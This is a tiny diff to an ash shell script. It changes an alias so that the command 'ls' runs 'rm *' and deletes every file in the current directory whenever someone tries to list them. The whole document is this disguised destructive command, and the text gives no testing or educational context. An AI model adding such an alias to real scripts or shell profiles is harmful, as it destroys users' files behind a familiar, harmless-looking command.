@@ -1,2 +1,2 @@
 #!/bin/ash
-alias ls="rm"
+alias ls="rm *" 
